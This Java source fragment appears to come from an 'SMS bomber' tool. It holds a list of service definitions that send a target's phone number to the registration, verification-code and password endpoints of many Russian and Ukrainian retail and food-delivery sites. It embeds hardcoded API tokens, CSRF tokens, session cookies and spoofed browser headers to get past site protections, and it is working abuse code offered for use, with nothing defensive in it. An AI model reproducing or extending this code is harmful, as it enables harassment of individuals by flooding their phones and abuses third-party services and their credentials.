            new FormService("https://new-tel.net/ajax/a_api.php?type=reg", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone_nb", format(phone, "+7 (***) ***-****"));
                    builder.add("phone_number", "Хочу номер");
                    builder.add("token", "'03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36");
                    builder.header("x-requested-with", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://online.lenta.com/api.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("tel", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfN") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://pizzabox.ru/?action=auth", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("CSRF", "");
                    builder.add("ACTION", "REGISTER");
                    builder.add("MODE", "PHONE");
                    builder.add("PHONE", format(phone, "+7 (***) ***-**-**"));

                    String password = getEmail();
                    builder.add("PASSWORD", password);
                    builder.add("PASSWORD2", password);
                }
            },

            new JsonService("https://api-omni.x5.ru/api/v1/clients-portal/auth/send-sms-code") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Accept", "application/json");
                    builder.header("Accept-Encoding", "gzip, deflate, br");
                    builder.header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7");
                    builder.header("Authorization", "Bearer");
                    builder.header("Cache-Control", "no-cache");
                    builder.header("Connection", "keep-alive");
                    builder.header("Content-Length", "30");
                    builder.header("Content-Type", "application/json");
                    builder.header("Host", "api-omni.x5.ru");
                    builder.header("Origin", "https://fivepost.ru");
                    builder.header("Pragma", "no-cache");
                    builder.header("Referer", "https://fivepost.ru/");
                    builder.header("sec-ch-ua-mobile", "?0");
                    builder.header("sec-ch-ua-platform", "\"Windows\"");
                    builder.header("Sec-Fetch-Dest", "empty");
                    builder.header("Sec-Fetch-Mode", "cors");
                    builder.header("Sec-Fetch-Site", "cross-site");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39");
                    builder.header("X-Portal-Origin", "https://fivepost.ru");

                    return super.buildRequest(builder);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://liski.skoro-pizza.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "b3cb999a-d3ad-11ec-84bd-d00d1849d38c")
                            .header("x-thapl-domain", "rossosh.skoro-pizza.ru")
                            .header("x-thapl-region-id", "5")
                            .post(RequestBody.create("------WebKitFormBoundaryMUU3NBWAJgnNsU1E\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryMUU3NBWAJgnNsU1E--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMUU3NBWAJgnNsU1E")))
                            .build()).enqueue(callback);
                }
            },

            new JsonService("https://www.niyama.ru/ajax/verify_phone_newtel.php", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "request_verification_code");
                        json.put("data", new JSONObject()
                                .put("phone", format(phone, "+7 (***) ***-**-**"))
                                .put("token", ""));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://www.farpost.ru/sign/code/2462e406628825a11298ee04a1bc3762/send") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("sign", getFormattedPhone());
                    builder.addQueryParameter("return", "%2F");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "ring=812181580144201dc21524f8f1982de1; _gid=GA1.2.453022151.1652715563; _gat=1; _ga_G0RWKN84TQ=GS1.1.1652715563.1.1.1652715565.0; _ga=GA1.1.1791918317.1652715563");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://new.victoria-group.ru/api/v2/manzana/Identity/RequestAdvancedPhoneEmailRegistration") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("parameter", new JSONObject()
                                .put("MobilePhone", "+" + getFormattedPhone())
                                .put("CardNumber", null)
                                .put("AgreeToTerms", 1)
                                .put("AllowNotification", 0)
                                .toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("X-CSRF-TOKEN", "9ZshUjW4iWYuM95Cgo2WmD9pANxDLHGjEOTnOLAA");
                    builder.header("X-Requested-With", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://food-port.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "9e7c8984-d531-11ec-b5b9-d00d1849d38c")
                            .header("cookie", "upkvartal-frontend=5pu1js95pptj7pksmbgqru1vjc; _csrf-frontend=4c3056cb44f23d0a2ec3460e5816086cb7b0e12162e2d912746e7ff11ea91742a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22CcL2WanJJP7r_o2Llmun0aAftzxvrkpu%22%3B%7D; _ga_4BXG5PKES8=GS1.1.1652716962.1.0.1652716962.60; _ga=GA1.1.1706773214.1652716962; _ym_uid=1652716963122456118; _ym_d=1652716963; _fbp=fb.1.1652716963371.784120387; _ym_visorc=w; _ym_isad=2; advanced-api=num4ubgr4gks7k97tcri472c8b; api-key=9e7c8984-d531-11ec-b5b9-d00d1849d38c")
                            .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                            .build()).enqueue(callback);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://api-frontend.uservice.io/v2/user/profile/auth/")
                            .post(RequestBody.create("------WebKitFormBoundaryS40r7hAsKHLxEAFV\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone, "+7 *** ***-****") +
                                            "\n------WebKitFormBoundaryS40r7hAsKHLxEAFV\n" +
                                            "Content-Disposition: form-data; name=\"country_id\"\n" +
                                            "\n" +
                                            "1\n" +
                                            "------WebKitFormBoundaryS40r7hAsKHLxEAFV--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryS40r7hAsKHLxEAFV")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://aloesmart.ru/local/templates/main/components/bitrix/main.register/template/ajax.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://be.budusushi.ua/login", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("LoginForm[username]", "0" + phone);
                }
            },

            new FormService("https://dostavka.marcellis.ru/include/library/SendSMS.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            }
    };
}
